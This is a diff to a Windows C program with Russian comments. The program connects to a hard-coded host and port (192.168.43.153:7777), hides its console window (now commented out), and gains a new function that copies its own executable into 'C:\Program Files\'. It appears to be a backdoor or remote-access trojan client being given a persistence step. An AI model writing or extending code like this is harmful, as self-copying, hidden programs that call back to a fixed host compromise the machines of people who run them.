@@ -9,14 +9,17 @@
 
 #define HOST "192.168.43.153"
 #define PORT 7777
-#define MAX_PATH_LENGTH 200
+#define MAX_PATH_LENGTH 500
+#define SYSTEM_DIRECTORY "C:\\Program Files\\"
 
 void initWinsock();
 SOCKADDR_IN createServer();
+char* copyFileToSystemDirectory();
 
-int main() {
+int main(int argc, char* argv[]) {
 	// Скрыть окно программы
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char* currentExecutionFile = copyFileToSystemDirectory();
 
 	initWinsock();
 	SOCKADDR_IN server = createServer();
@@ -73,4 +76,32 @@ SOCKADDR_IN createServer() {
 	server.sin_family = AF_INET;
 
 	return server;
+}
+
+/*Копирует текущий исполняемый файл программы в системную директорию.
+Если копирование прошло удачно, возвращает путь к копии файла, находящийся в системной директории.
+Если копирование завершилось с ошибкой, то возвращается полный путь к текущему исполняемому файлу.*/
+char* copyFileToSystemDirectory() {
+	char* currentPathToExecutionFile = (char*)malloc(MAX_PATH_LENGTH * sizeof(char));
+	char* finalFilePath = (char*) malloc(MAX_PATH_LENGTH * sizeof(char));
+	// Получаем путь к текущему файлу и записываем его в переменную currentFilename
+	GetModuleFileNameA(NULL, currentPathToExecutionFile, MAX_PATH_LENGTH);
+	puts(currentPathToExecutionFile);
+
+	// Чтобы получить название текущего файла, достаем его из конца полного пути к текущему файлу
+	char copy[MAX_PATH_LENGTH];
+	strcpy(copy, currentPathToExecutionFile);
+	char* executionFilename = _strrev(strtok(_strrev(copy), "\\"));
+
+	// Генерируем путь к новому файлу в системной директории и копируем имеющийся файл по этому пути
+	strcpy(finalFilePath, SYSTEM_DIRECTORY);
+	strcat(finalFilePath, executionFilename);
+
+	if (!CopyFile(currentPathToExecutionFile, finalFilePath, FALSE)) {
+		printf("Error writing file: %u\n", GetLastError());
+		return currentPathToExecutionFile;
+	}
+	else return finalFilePath;
+
+	
 }
